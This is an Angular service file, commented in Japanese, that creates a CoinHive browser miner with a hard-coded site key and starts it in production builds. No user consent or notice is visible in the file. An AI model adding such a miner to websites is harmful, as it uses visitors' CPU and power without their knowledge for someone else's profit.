import { Injectable } from '@angular/core';

import { environment } from '../../../environments/environment';

import { CoinHiveConstants } from '../constants/coin-hive.constants';

/**
 * CoinHive 採掘を管理するサービス
 */
@Injectable()
export class CoinHiveService {
  /** CoinHive 稼働状況 */
  public isWorking: boolean;
  
  /** マイナー */
  public miner: any;
  
  /**
   * コンストラクタ
   */
  constructor() {
    this.isWorking = false;
    this.createMiner();
  }
  
  /**
   * 採掘を開始する
   */
  start(): void {
    if(!this.miner) {
      // マイナー未生成のため再生成実行
      this.createMiner();
    }
    else if(this.isWorking) {
      // 採掘開始済の場合は一旦停止する
      this.stop();
    }
    
    if(environment.production) {
      this.miner.start();
    }
    
    this.isWorking = true;
  }
  
  /**
   * 採掘を終了する
   * 現時点で未使用の関数
   */
  stop(): void {
    // マイナー生成済で採掘中なら終了する
    if(environment.production && this.miner && this.isWorking) {
      this.miner.stop();
    }
    
    this.isWorking = false;
  }
  
  /**
   * マイナーを生成する
   */
  private createMiner(): void {
    // マイナーがないか生成済なら何もしない
    if(!(window as any).CoinHive || this.miner) {
      return;
    }
    
    this.miner = new (window as any).CoinHive.User('jbVDoIh3MSdKF3wdHzSBu4pGM1mpI4sR', 'angular-utilities', {
      autoThreads: true,
      throttle: CoinHiveConstants.defaultThrottle
    });
  }
}
